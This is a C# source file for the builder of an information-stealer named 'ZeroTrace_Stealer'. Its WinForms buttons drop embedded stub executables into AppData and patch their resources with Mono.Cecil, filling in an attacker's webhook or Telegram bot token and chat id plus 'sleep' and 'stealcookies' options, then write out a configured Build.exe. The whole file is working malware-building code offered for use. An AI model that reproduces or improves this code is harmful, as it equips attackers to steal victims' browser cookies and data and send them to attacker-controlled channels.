using DevExpress.XtraBars;
using Mono.Cecil;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ZeroTrace_Stealer
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        public Form1()
        {
            InitializeComponent();

        }

        private void simpleButton13_Click(object sender, EventArgs e)
        {
            try


            {
                // webhook
                byte[] zerowebhook = Properties.Resources.ZeroWebhook;
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubWebHook.exe", zerowebhook );
                Thread.Sleep(1000);
                ZeroTrace.Builder.Build.ModifyAndSaveAssembly(textEdit3.Text, "Build.exe");
                Thread.Sleep(1000);

                MessageBox.Show(" { Build Success ! } : " + Environment.CurrentDirectory + "\\Build.exe", "Success!");

                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubWebHook.exe");

            }

            catch
            {
              
            }
        }


        private void simpleButton1_Click(object sender, EventArgs e)
        {
            // TELEGRAM
            try
            {
                byte[] telegram = Properties.Resources.ZeroTelegram;
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe", telegram);
                Thread.Sleep(1000);


              
                string sleep = checkEdit1.Checked ? "true" : "false";

                string stealcookies = checkEdit2.Checked ? "true" : "false";

          
          

                // put them there : 
                try

                {
                    ZeroTrace.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, sleep, stealcookies, "Build.exe");
                }
                catch
                {
                    ZeroTrace.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, sleep, stealcookies, "Build.exe");
                }

                Thread.Sleep(1000);


                MessageBox.Show(" { Build Success ! } : " + Environment.CurrentDirectory + "\\Build.exe", "Success!");

                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe";
                if (File.Exists(filePath))
                {
                    try
                    {
                        File.Delete(filePath);
                    }
                    catch (IOException ex)
                    {
                        MessageBox.Show("Error deleting file: " + ex.Message, "Error");
                    }
                }


            }

            catch
            {
    
            }
        }
    }
}

namespace ZeroTrace.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            using (var stream = new FileStream(stubPath, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                var memoryStream = new MemoryStream();
                stream.CopyTo(memoryStream);
                memoryStream.Position = 0; // Reset position to the beginning of the stream
                return AssemblyDefinition.ReadAssembly(memoryStream);
            }
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string webhook, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("DestinyClient.Resources.webhook.txt", webhook, assembly);

        }

        public static void UpdateIPAndPortTelegram(string token, string chatid, string sleep, string stealcookies , AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("DestinyClient.Resources.token.txt", token, assembly);
            UpdateResource("DestinyClient.Resources.chatid.txt", chatid, assembly);
            UpdateResource("DestinyClient.Resources.sleep.txt", sleep, assembly);
            UpdateResource("DestinyClient.Resources.stealcookies.txt", stealcookies, assembly);




        }

        public static void ModifytelegramAssembly(string token, string chatid, string sleep, string stealcookies,  string outputPath)
        {
            try
            {
                string stubPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe";

                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);

                // Update the IP and Port resources
                UpdateIPAndPortTelegram(token, chatid, sleep, stealcookies, assembly);


                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }


        public static void ModifyAndSaveAssembly(string webhook, string outputPath)
        {
            try
            {
                string stubPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubWebHook.exe";

                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);

                // Update the IP and Port resources
                UpdateIPAndPort(webhook, assembly);

                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }
}
